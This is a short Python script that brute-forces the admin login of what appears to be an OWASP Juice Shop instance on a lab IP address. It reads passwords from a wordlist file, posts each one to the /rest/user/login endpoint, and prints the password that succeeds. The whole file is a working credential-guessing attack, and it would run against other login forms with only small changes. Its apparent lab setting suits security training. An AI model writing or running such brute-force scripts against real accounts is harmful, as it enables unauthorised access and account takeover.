import requests
from sys import argv

_file = argv[1]
data = {
    'email': 'admin@juice-sh.op',
    'password': None
}
url = 'http://10.10.116.1/rest/user/login'
num = 0
with open(_file, 'r') as a_file:
    for lines in a_file:
        line = lines.strip()
        data['password'] = line
        print(str(data) + " " + str(num))
        r = requests.post(url, data = data)
        if r.status_code >= 400:
            num += 1 
            pass
        else:
            print("THE CORRECT PASSWORD IS >>" + data['password'])
            break


